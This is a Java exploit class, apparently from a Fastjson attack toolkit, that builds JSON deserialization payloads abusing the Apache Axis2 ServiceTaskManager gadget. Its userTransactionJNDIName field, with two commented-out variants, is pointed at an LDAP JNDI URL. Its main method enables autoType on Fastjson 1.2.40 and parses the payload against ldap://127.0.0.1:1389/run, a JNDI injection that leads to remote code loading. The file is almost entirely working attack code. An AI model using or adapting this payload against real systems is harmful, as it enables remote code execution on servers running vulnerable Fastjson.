package fastjsonExp;

import org.apache.axis2.transport.jms.ServiceTaskManager;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * 未完成
 * still work at fastjson 1.2.
 */

public class EXP4axis2_transport {

    public String JNDI_URL = "";
    public String payload =
    "{\"@type\":\"org.apache.axis2.transport.jms.ServiceTaskManager\",\"userTransactionJNDIName\":\"replace_here\"}";

    //public String payload =
    //"{\"@type\":\"org.apache.axis2.transport.jms.ServiceTaskManager\",\"cacheLevel\":-1,\"connFactoryJNDIName\":\"replace_here\",\"connection\":null}";

    //public String payload =
      //"{\"@type\":\"org.apache.axis2.transport.jms.ServiceTaskManager\",\"destinationJNDIName\":\"replace_here\",\"destination\":null}";


    public  void actual_fun(String url) throws Exception {

        System.out.println(url);
        ServiceTaskManager s = new ServiceTaskManager();
        s.setUserTransactionJNDIName(url);
        Class a = Class.forName("org.apache.axis2.transport.jms.ServiceTaskManager");
        Method m = a.getDeclaredMethod("getUserTransaction");
        m.setAccessible(true);
        m.invoke(s, null);

    }
    public  void actual_fun() throws Exception{
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4axis2_transport(){}
    public EXP4axis2_transport(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        System.out.println("payload:"+this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.40");
        myFastjson.mySetAutoType(true);
        EXP4axis2_transport exp = new EXP4axis2_transport("ldap://127.0.0.1:1389/run");
        String s = exp.getPayload();
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();

    }
}
